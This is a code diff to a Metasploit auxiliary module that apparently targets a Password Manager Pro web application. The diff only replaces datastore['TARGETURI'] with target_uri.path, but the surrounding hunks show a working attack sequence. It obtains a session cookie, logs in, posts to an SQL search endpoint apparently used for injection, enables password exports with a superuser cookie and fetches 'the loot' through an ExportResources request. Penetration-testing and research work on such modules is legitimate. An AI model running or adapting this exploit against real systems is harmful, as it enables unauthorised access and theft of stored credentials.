@@ -54,7 +54,7 @@ class Metasploit3 < Msf::Auxiliary
     # 1st step: we obtain a JSESSIONID cookie...
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => normalize_uri(datastore['TARGETURI'], 'PassTrixMain.cc')
+      'uri' => normalize_uri(target_uri.path, 'PassTrixMain.cc')
     })
 
     if res and res.code == 200
@@ -75,7 +75,7 @@ class Metasploit3 < Msf::Auxiliary
       cookie = res.get_cookies
       res = send_request_cgi({
         'method' => 'POST',
-        'uri' => normalize_uri(datastore['TARGETURI'], 'login', 'AjaxResponse.jsp'),
+        'uri' => normalize_uri(target_uri.path, 'login', 'AjaxResponse.jsp'),
         'ctype' => "application/x-www-form-urlencoded",
         'cookie' => cookie,
         'vars_get' => {
@@ -102,7 +102,7 @@ class Metasploit3 < Msf::Auxiliary
 
       res = send_request_cgi({
         'method' => 'POST',
-        'uri' => normalize_uri(datastore['TARGETURI'], 'j_security_check;' + cookie.to_s.gsub(';','')),
+        'uri' => normalize_uri(target_uri.path, 'j_security_check;' + cookie.to_s.gsub(';','')),
         'ctype' => "application/x-www-form-urlencoded",
         'cookie' => cookie,
         'vars_post' => vars_post
@@ -110,7 +110,7 @@ class Metasploit3 < Msf::Auxiliary
       if res and res.code == 302
         res = send_request_cgi({
           'method' => 'GET',
-          'uri' => normalize_uri(datastore['TARGETURI'], 'PassTrixMain.cc'),
+          'uri' => normalize_uri(target_uri.path, 'PassTrixMain.cc'),
           'cookie' => cookie,
         })
 
@@ -174,7 +174,7 @@ class Metasploit3 < Msf::Auxiliary
 
     res = send_request_cgi({
       'method'    => 'POST',
-      'uri'       => normalize_uri(datastore['TARGETURI'], "SQLAdvancedALSearchResult.cc"),
+      'uri'       => normalize_uri(target_uri.path, "SQLAdvancedALSearchResult.cc"),
       'cookie'    => @cookie,
       'vars_post'  => {
         'COUNT'          => Rex::Text.rand_text_numeric(2),
@@ -237,7 +237,7 @@ class Metasploit3 < Msf::Auxiliary
       # 1st we turn on password exports
       send_request_cgi({
         'method' => 'POST',
-        'uri' => normalize_uri(datastore['TARGETURI'], 'ConfigureOffline.ve'),
+        'uri' => normalize_uri(target_uri.path, 'ConfigureOffline.ve'),
         'cookie' => cookie_su,
         'vars_post'  => {
           'IS_XLS'         => 'true',
@@ -253,7 +253,7 @@ class Metasploit3 < Msf::Auxiliary
       # now get the loot!
       res = send_request_cgi({
         'method' => 'GET',
-        'uri' => normalize_uri(datastore['TARGETURI'], 'jsp', 'xmlhttp', 'AjaxResponse.jsp'),
+        'uri' => normalize_uri(target_uri.path, 'jsp', 'xmlhttp', 'AjaxResponse.jsp'),
         'cookie' => cookie_su,
         'vars_get' => {
           'RequestType' => 'ExportResources'
